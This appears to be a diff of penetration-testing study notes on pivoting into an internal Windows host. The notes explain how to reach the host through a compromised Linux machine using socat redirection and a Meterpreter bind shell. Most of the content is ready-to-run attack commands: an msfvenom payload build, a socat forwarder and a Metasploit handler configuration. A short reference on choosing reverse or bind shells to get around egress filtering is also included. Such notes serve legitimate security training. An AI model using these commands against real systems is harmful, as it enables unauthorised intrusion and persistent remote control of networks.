@@ -1,36 +1,39 @@
-1. Identify internal Windows targets reachable only through a compromised Linux pivot.
-2. Verify egress restrictions prevent reverse shells; select bind shell for persistence/access.
-3. Use socat on the pivot to bridge the network gap between the attack host and the internal bind listener.
-4. Establish a Meterpreter session by pointing the Metasploit handler at the pivot's redirector port.
+# Socat Redirection — Bind Shell
 
----
+Bind variant: Windows listens, your attack host connects inbound through socat on the pivot.
 
-## Socat Bind Shell Redirection
+Generate bind payload on Windows — no LHOST needed, just the port Windows will listen on:
 
-**When to use** Internal target is firewalled from the attack host but reachable from a compromised pivot. Use when the target environment permits hosting a **bind shell listener**.
-
-**Commands** Generate a Windows bind shell executable to be hosted on the internal target
-
-```
-msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <FILE_PATH> LPORT=<PORT>
+```bash
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <PAYLOAD>.exe LPORT=8443
 ```
 
-Start the redirector on the pivot to forward incoming traffic to the internal target bind port
+Start socat on pivot — listens for your inbound connection and forwards to Windows:
 
-```
-socat TCP4-LISTEN:<PORT>,fork TCP4:<TARGET_IP>:<PORT>
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:<WINDOWS_TARGET_IP>:8443
 ```
 
-Configure the Metasploit handler to route through the pivot host listener
+MSF bind handler — connect outbound to the pivot's socat port:
 
 ```
 use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set RHOST <PIVOT_IP>
-set LPORT <PORT>
+set LPORT 8080
 run
 ```
 
-**Gotchas** **Payload execution** must be active on the target before the Metasploit handler attempts to connect or the stage request will fail.
+Flow: `MSF → pivot:8080 → socat → Windows:8443`
 
-> ⚠️ Gap: Pivot host local firewall must be configured to allow inbound traffic on the socat listener port to accept the connection from the attack host.
+Session shows the pivot's IP as the connection endpoint — expected.
+
+---
+
+## Reverse vs Bind Socat — Quick Reference
+
+Reverse: Windows initiates → pivot:PORT → socat → attack host. Use when Windows can reach the pivot but you can't reach Windows.
+
+Bind: Attack host initiates → pivot:PORT → socat → Windows listener. Use when you can reach the pivot but can't get outbound connections from Windows.
+
+> [!tip] Bind shells are useful when egress filtering on the Windows target blocks outbound connections but allows inbound. Pick based on what traffic the firewall permits, not personal preference.
